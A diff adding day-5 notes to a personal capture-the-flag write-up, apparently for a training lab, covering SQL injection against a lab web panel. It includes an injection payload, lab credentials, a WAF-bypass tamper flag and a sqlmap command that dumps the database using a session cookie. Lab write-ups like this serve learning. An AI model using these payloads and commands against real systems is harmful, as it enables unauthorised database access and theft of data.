@@ -44,3 +44,21 @@ Date format is `YYYYMMDD`
 - Compose the wfuzz command according to the example
 - Run gobuster searching for php files as well using `-x "php"`
 - Use wfuzz and the provided wordlist to find the correct date for which the api returns the key.
+
+# Day 5
+
+`export IP=10.10.159.207`
+
+```
+Look at alternative database systems that are better than sqlite. Also, don't forget that you installed a Web Application Firewall (WAF) after last year's attack. In case you've forgotten the command, you can tell SQLMap to try and bypass the WAF by using --tamper=space2comment
+```
+
+santa:santapassword
+john:johnstrong
+
+- Took me a long while to discover that I should check port 8000 and not the demo on port 3000
+- Gifts where easy to query using an `a' or 1-=1; -- ` injection
+- same with the admin password using a union select on the `users`. 
+- Getting the flag took me a really long time since sqlmap did not give me usefull feedback on my mistakes. In the end I had not realized that the dbms should have been sqlite...
+
+sqlmap --url http://10.10.159.207:8000/santapanel?search=abc --method=GET --dbms sqlite --cookie "session=eyJhdXRoIjp0cnVlfQ.X8wDtw.8s8ipE8tFqPzPxWcT9HngM24Ij8" --dump
